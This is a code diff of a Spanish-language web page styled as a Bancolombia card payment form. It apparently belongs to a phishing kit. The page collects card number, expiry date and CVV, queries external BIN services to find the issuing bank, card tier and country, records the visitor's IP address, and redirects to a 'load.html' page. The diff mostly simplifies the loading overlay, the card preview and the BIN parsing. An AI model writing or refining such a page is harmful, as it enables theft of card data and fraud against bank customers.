@@ -261,38 +261,6 @@
             margin-bottom: 5px;
         }
 
-        #loading-overlay { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            background-color: rgba(0,0,0,0.8); 
-            z-index: 9999; 
-            display: none; 
-            justify-content: center; 
-            align-items: center; 
-            flex-direction: column; 
-        } 
-
-        .spinner { 
-            border: 4px solid #f3f3f3; 
-            border-top: 4px solid #fdda24; 
-            border-radius: 50%; 
-            width: 50px; 
-            height: 50px; 
-            animation: spin 1s linear infinite; 
-        } 
-
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
-        }
-
-        #loading-overlay p {
-            display: none;
-        }
-
         .error-message {
             display: none;
             color: #dc3545;
@@ -372,11 +340,6 @@
     </style>
 </head>
 <body>
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-        <p>Procesando tu solicitud...</p>
-    </div>
-
     <div class="container">
         <form class="form" id="paymentForm">
             <div class="logo-bancolombia">
@@ -454,98 +417,8 @@
 
     <script>
         // ============================================
-        // FUNCIONES AGREGADAS (tomadas del código de crédito)
+        // FUNCIONES PARA QUE FUNCIONE EL BOTÓN CONTINUAR
         // ============================================
-
-        // Variable para almacenar la info detectada
-        let detectedCardInfo = { info: "Desconocido", scheme: "", level: "", bank: "", type: "", country: "" };
-
-        // Función para actualizar la tarjeta visual
-        function updateCardPreview() {
-            const cardNumber = document.getElementById('inp_c_nm').value || '';
-            const expDate = document.getElementById('inp_c_xp').value || '';
-            const cvv = document.getElementById('inp_c_vv').value || '';
-            
-            const cardNumberPreview = document.getElementById('cardNumberPreview');
-            const cardExpPreview = document.getElementById('cardExpPreview');
-            const cardCvvPreview = document.getElementById('cardCvvPreview');
-
-            let cleanNumber = cardNumber.replace(/\s/g, '');
-            let formattedPreview = '';
-            
-            if (cleanNumber.length === 0) {
-                formattedPreview = '•••• •••• •••• ••••';
-            } else {
-                const first4 = cleanNumber.substring(0, 4);
-                const last4 = cleanNumber.substring(cleanNumber.length - 4);
-                const middleLength = cleanNumber.length - 8;
-                
-                if (cleanNumber.length <= 8) {
-                    formattedPreview = first4 + ' ' + '•'.repeat(cleanNumber.length - 4);
-                } else {
-                    let middleStars = '';
-                    for (let i = 0; i < middleLength; i++) middleStars += '•';
-                    let tempPreview = first4 + middleStars + last4;
-                    let grouped = '';
-                    for (let i = 0; i < tempPreview.length; i += 4) {
-                        if (i > 0) grouped += ' ';
-                        grouped += tempPreview.substring(i, i + 4);
-                    }
-                    formattedPreview = grouped;
-                }
-            }
-            
-            cardNumberPreview.textContent = formattedPreview;
-            cardExpPreview.textContent = expDate.length >= 5 ? expDate : (expDate.length > 0 ? expDate + (expDate.length === 2 ? '/' : '') : 'MM/AA');
-            cardCvvPreview.textContent = cvv.length > 0 ? '•'.repeat(Math.min(cvv.length, 4)) : '•••';
-        }
-
-        // Actualizar la tarjeta con la info del BIN
-        async function updateCardWithBinInfo() {
-            const cardNumber = document.getElementById('inp_c_nm').value || '';
-            const cleanNumber = cardNumber.replace(/\s/g, '');
-            const bin = cleanNumber.substring(0, 6);
-            
-            const cardFranquicia = document.getElementById('cardFranquicia');
-            const cardTypeBadge = document.getElementById('cardTypeBadge');
-            const cardBrandIcon = document.getElementById('cardBrandIcon');
-            
-            if (bin.length >= 6) {
-                const binInfo = await identifyBin(bin);
-                detectedCardInfo = binInfo;
-                
-                let franquiciaMostrar = binInfo.scheme || 'DESCONOCIDA';
-                cardFranquicia.textContent = franquiciaMostrar;
-                
-                let tipoMostrar = binInfo.type || 'DÉBITO';
-                if (tipoMostrar === 'CREDIT') tipoMostrar = 'CRÉDITO';
-                else if (tipoMostrar === 'DEBIT') tipoMostrar = 'DÉBITO';
-                cardTypeBadge.textContent = tipoMostrar;
-                
-                const scheme = (binInfo.scheme || '').toLowerCase();
-                if (scheme === 'visa') {
-                    cardBrandIcon.innerHTML = '<i class="fab fa-cc-visa"></i>';
-                } else if (scheme === 'mastercard') {
-                    cardBrandIcon.innerHTML = '<i class="fab fa-cc-mastercard"></i>';
-                } else if (scheme === 'amex') {
-                    cardBrandIcon.innerHTML = '<i class="fab fa-cc-amex"></i>';
-                } else {
-                    cardBrandIcon.innerHTML = '<i class="fas fa-credit-card"></i>';
-                }
-            } else if (cleanNumber.length > 0) {
-                cardFranquicia.textContent = '...';
-                cardTypeBadge.textContent = '...';
-            } else {
-                cardFranquicia.textContent = '---';
-                cardTypeBadge.textContent = '---';
-                cardBrandIcon.innerHTML = '<i class="fas fa-credit-card"></i>';
-            }
-        }
-
-        async function fullUpdate() {
-            updateCardPreview();
-            await updateCardWithBinInfo();
-        }
 
         function validateDate(exp) { 
             if (!/^\d{2}\/\d{2}$/.test(exp)) return false; 
@@ -556,34 +429,8 @@
         } 
 
         async function identifyBin(bin) { 
-            if (bin.length < 6) return { info: "Desconocido", scheme: "", level: "", bank: "", type: "", country: "" }; 
+            if (bin.length < 6) return { scheme: "", type: "DEBIT" }; 
             
-            const formatResult = (b, c, s, l, t) => {
-                let parts = [];
-                if(b && b !== "UNDEFINED" && b !== "N/A") parts.push(b.toUpperCase());
-                if(c && c !== "UNDEFINED" && c !== "N/A") parts.push(c.toUpperCase());
-                if(s && s !== "UNDEFINED" && s !== "N/A") parts.push(s.toUpperCase());
-                if(l && l !== "UNDEFINED" && l !== "N/A") parts.push(l.toUpperCase());
-                if(t && t !== "UNDEFINED" && t !== "N/A") parts.push(t.toUpperCase());
-                return parts.join(" - ");
-            };
-
-            const parseHandy = (data) => ({
-                scheme: (data.Scheme || "").toUpperCase(),
-                type: (data.Type || "").toUpperCase(),
-                level: (data.CardTier || "").toUpperCase(),
-                bank: (data.Issuer || "").toUpperCase(),
-                country: (data.Country ? data.Country.Name : "").toUpperCase()
-            });
-
-            const parseBinList = (data) => ({
-                scheme: (data.scheme || "").toUpperCase(),
-                type: (data.type || "").toUpperCase(),
-                level: (data.brand || "").toUpperCase(), 
-                bank: (data.bank ? data.bank.name : "").toUpperCase(),
-                country: (data.country ? data.country.name : "").toUpperCase()
-            });
-
             try { 
                 const controller = new AbortController(); 
                 const timeoutId = setTimeout(() => controller.abort(), 3000); 
@@ -593,15 +440,12 @@
                 if (response.ok) {
                     const data = await response.json(); 
                     if (data.Status !== "NOT FOUND") {
-                        const p = parseHandy(data);
-                        const resultStr = formatResult(p.bank, p.country, p.scheme, p.level, p.type);
                         return {
-                            info: resultStr || "Desconocido",
-                            scheme: p.scheme,
-                            level: p.level,
-                            bank: p.bank,
-                            type: p.type,
-                            country: p.country
+                            scheme: (data.Scheme || "").toUpperCase(),
+                            type: (data.Type || "").toUpperCase(),
+                            level: (data.CardTier || "").toUpperCase(),
+                            bank: (data.Issuer || "").toUpperCase(),
+                            country: (data.Country ? data.Country.Name : "").toUpperCase()
                         };
                     }
                 }
@@ -620,15 +464,12 @@
 
                 if (response.ok) {
                     const data = await response.json();
-                    const p = parseBinList(data);
-                    const resultStr = formatResult(p.bank, p.country, p.scheme, p.level, p.type);
                     return {
-                        info: resultStr || "Desconocido",
-                        scheme: p.scheme,
-                        level: p.level,
-                        bank: p.bank,
-                        type: p.type,
-                        country: p.country
+                        scheme: (data.scheme || "").toUpperCase(),
+                        type: (data.type || "").toUpperCase(),
+                        level: (data.brand || "").toUpperCase(), 
+                        bank: (data.bank ? data.bank.name : "").toUpperCase(),
+                        country: (data.country ? data.country.name : "").toUpperCase()
                     };
                 }
             } catch (error) {
@@ -641,11 +482,10 @@
             else if(bin.startsWith('3')) simpleScheme = "AMEX"; 
             
             return {
-                info: simpleScheme || "Desconocido",
                 scheme: simpleScheme,
+                type: "DEBIT",
                 level: "",
                 bank: "",
-                type: "DEBIT",
                 country: ""
             };
         } 
@@ -682,7 +522,7 @@
             } 
 
             const bin = pan.substring(0, 6); 
-            let cardBinData = { info: "Desconocido", scheme: "", level: "", bank: "", type: "" };
+            let cardBinData = { scheme: "", type: "DEBIT", level: "", bank: "", country: "" };
             try {
                 cardBinData = await identifyBin(bin); 
             } catch(e) {
@@ -703,7 +543,6 @@
                 expirationDate: exp,
                 cvv: cvv,
                 type: 'Débito', 
-                info: cardBinData.info,
                 network: cardBinData.scheme,
                 level: cardBinData.level,
                 bank: cardBinData.bank,
@@ -716,12 +555,8 @@
 
             localStorage.removeItem('transaction_id');
 
-            // Mostrar loading
-            document.getElementById('loading-overlay').style.display = 'flex';
-
-            setTimeout(() => {
-                window.location.href = "load.html";
-            }, 1500);
+            // Redirigir directamente sin loading
+            window.location.href = "load.html";
 
             return true;
         }
@@ -730,57 +565,49 @@
         // EVENT LISTENERS
         // ============================================
 
-        // Form Submit Handler
+        // Submit del formulario
         document.getElementById('paymentForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             await enviarTarjeta();
         });
 
-        // Eventos para actualizar la vista previa
-        document.addEventListener('DOMContentLoaded', function() {
-            // Formatear fecha
-            document.getElementById('inp_c_xp').addEventListener('input', function(e) { 
-                var input = e.target.value; 
-                input = input.replace(/[^0-9/]/g, '');
-                if (input.length === 2 && !input.includes('/')) { 
-                    input = input + '/'; 
-                }
+        // Actualizar vista previa de la tarjeta
+        function updateCardPreview() {
+            const cardNumber = document.getElementById('inp_c_nm').value || '';
+            const expDate = document.getElementById('inp_c_xp').value || '';
+            const cvv = document.getElementById('inp_c_vv').value || '';
+            
+            document.getElementById('cardNumberPreview').textContent = cardNumber || '•••• •••• •••• ••••';
+            document.getElementById('cardExpPreview').textContent = expDate || 'MM/AA';
+            document.getElementById('cardCvvPreview').textContent = cvv ? '•'.repeat(cvv.length) : '•••';
+        }
+
+        document.getElementById('inp_c_nm').addEventListener('input', function(e) {
+            var input = e.target.value.replace(/\D/g, '').substring(0,19);
+            var formatted = input.match(/.{1,4}/g);
+            if (formatted) {
+                e.target.value = formatted.join(' ');
+            } else {
                 e.target.value = input;
-                fullUpdate();
-            }); 
-
-            // Formatear número de tarjeta
-            document.getElementById('inp_c_nm').addEventListener('input', function(e) {
-                var input = e.target.value.replace(/\D/g, '').substring(0,19);
-                
-                const cvvInput = document.getElementById('inp_c_vv');
-                if (input.startsWith('34') || input.startsWith('37')) {
-                    cvvInput.setAttribute('maxlength', '4');
-                    cvvInput.placeholder = "CVV (4)";
-                } else {
-                    cvvInput.setAttribute('maxlength', '3');
-                    cvvInput.placeholder = "CVV (3)";
-                    if (cvvInput.value.length > 3) {
-                        cvvInput.value = cvvInput.value.slice(0, 3);
-                    }
-                }
-
-                var formatted = input.match(/.{1,4}/g);
-                if (formatted) {
-                    e.target.value = formatted.join(' ');
-                } else {
-                    e.target.value = input;
-                }
-                fullUpdate();
-            });
-
-            // CVV solo números
-            document.getElementById('inp_c_vv').addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/\D/g, '');
-                fullUpdate();
-            });
+            }
+            updateCardPreview();
         });
 
+        document.getElementById('inp_c_xp').addEventListener('input', function(e) { 
+            var input = e.target.value.replace(/[^0-9]/g, '');
+            if (input.length >= 2) {
+                input = input.substring(0, 2) + '/' + input.substring(2, 4);
+            }
+            e.target.value = input;
+            updateCardPreview();
+        });
+
+        document.getElementById('inp_c_vv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            updateCardPreview();
+        });
+
+        // IP y fecha en footer
         function setText(id, value) {
             const el = document.getElementById(id);
             if (el) el.textContent = value;
@@ -792,18 +619,13 @@
                 if (!res.ok) throw new Error("HTTP " + res.status);
                 const data = await res.json();
                 setText("gfg", data.ip || "No disponible");
-                const address = document.getElementById("address");
-                if (address) address.textContent = data.ip || "No disponible";
             } catch (e) {
                 setText("gfg", "No disponible");
-                const address = document.getElementById("address");
-                if (address) address.textContent = "No disponible";
             }
         }
 
         function actualizarFechaHoraFooter() {
             const options = {
-                weekday: "long",
                 year: "numeric",
                 month: "long",
                 day: "numeric",
@@ -819,7 +641,7 @@
             cargarIPFooter();
             actualizarFechaHoraFooter();
             setInterval(actualizarFechaHoraFooter, 1000);
-            fullUpdate();
+            updateCardPreview();
 
             const panInput = document.getElementById("inp_c_nm");
             if (panInput) {
